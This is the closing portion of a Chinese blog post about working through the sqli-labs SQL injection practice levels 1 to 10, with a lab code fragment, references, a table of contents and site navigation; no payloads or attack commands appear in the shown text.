#正确回显</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	echo <span class="string">&#x27;You are in...........&#x27;</span>;  #错误回显</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>虽然看起来很简单，不过总算系统的学习了下，下次继续学习less-11到less-20</p>
+<p><strong>宝剑锋从磨砺出，梅花香自苦寒来</strong></p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ugnfc/p/18150775">https://www.cnblogs.com/ugnfc/p/18150775</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_76913435/article/details/145601627">https://blog.csdn.net/2301_76913435/article/details/145601627</a></p>
+<p><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/1404344.html">https://cn-sec.com/archives/1404344.html</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>zh1yu
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://zh1yu.fun/2025/06/20/sqli-labs%E9%9D%B6%E5%9C%BAless-1-10/" title="sqli-labs靶场less-1-10">http://zh1yu.fun/2025/06/20/sqli-labs靶场less-1-10/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/06/17/DC-3-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/" rel="prev" title="DC-3-2靶机复现">
+      <i class="fa fa-chevron-left"></i> DC-3-2靶机复现
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/06/24/sql%E7%BB%95waf%E5%A7%BF%E5%8A%BF/" rel="next" title="sql绕waf姿势">
+      sql绕waf姿势 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#less-2"><span class="nav-number">1.</span> <span class="nav-text">less-2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8C%BA%E5%88%86%E5%AD%97%E7%AC%A6%E5%9E%8Bor%E6%95%B0%E5%AD%97%E5%9E%8B"><span class="nav-number">2.</span> <span class="nav-text">区分字符型or数字型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E5%AD%97%E7%AC%A6%E8%BF%98%E6%98%AF%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">如何判断字符还是数字型注入：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E5%93%AA%E7%A7%8D%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="nav-number">2.2.</span> <span class="nav-text">如何判断哪种字符型注入：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%80%94-%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E8%B5%B7%E4%BD%9C%E7%94%A8%EF%BC%9A"><span class="nav-number">2.3.</span> <span class="nav-text">—+什么时候起作用：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-3"><span class="nav-number">3.</span> <span class="nav-text">less-3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-4"><span class="nav-number">4.</span> <span class="nav-text">less-4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-5"><span class="nav-number">5.</span> <span class="nav-text">less-5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%95%E5%BC%95%E5%8F%B7%EF%BC%89"><span class="nav-number">6.</span> <span class="nav-text">报错注入（单引号）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#extractvalue-%EF%BC%8Cupdatexml-%EF%BC%8Cfloor-rand-group-by%EF%BC%8Cexp"><span class="nav-number">6.1.</span> <span class="nav-text">extractvalue()，updatexml()，floor() + rand() + group by，exp()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#union%E5%92%8Cand"><span class="nav-number">7.</span> <span class="nav-text">union和and</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#concat%E5%92%8Cgroup-concat%E5%8C%BA%E5%88%AB%EF%BC%9A"><span class="nav-number">8.</span> <span class="nav-text">concat和group_concat区别：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#limit-offset-count-%E7%9A%84%E5%90%AB%E4%B9%89%EF%BC%9A"><span class="nav-number">9.</span> <span class="nav-text">limit offset,count 的含义：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-6"><span class="nav-number">10.</span> <span class="nav-text">less-6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-7"><span class="nav-number">11.</span> <span class="nav-text">less-7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5"><span class="nav-number">12.</span> <span class="nav-text">文件读写注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getshell"><span class="nav-number">13.</span> <span class="nav-text">getshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-8"><span class="nav-number">14.</span> <span class="nav-text">less-8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">15.</span> <span class="nav-text">布尔盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-9"><span class="nav-number">16.</span> <span class="nav-text">less-9</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">17.</span> <span class="nav-text">时间盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%9F%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%9F"><span class="nav-number">18.</span> <span class="nav-text">时间盲注？布尔盲注？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-10"><span class="nav-number">19.</span> <span class="nav-text">less-10</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="zh1yu"
+      src="/images/zh1yu2.jpg">
+  <p class="site-author-name" itemprop="name">zh1yu</p>
+  <div class="site-description" itemprop="description">花有重开日,人无再少年</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/1182418846@qq.com" title="QQ → 1182418846@qq.com"><i class="qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class=""></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zh1yu</span>
+</div>
+
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+<!-- 引入jQuery -->
+<script type="text/javascript" src="//libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+
+<!-- 雪花特效 -->
+<script type="text/javascript" src="/js/snow.js"></script>
+
+</body>
+</html>
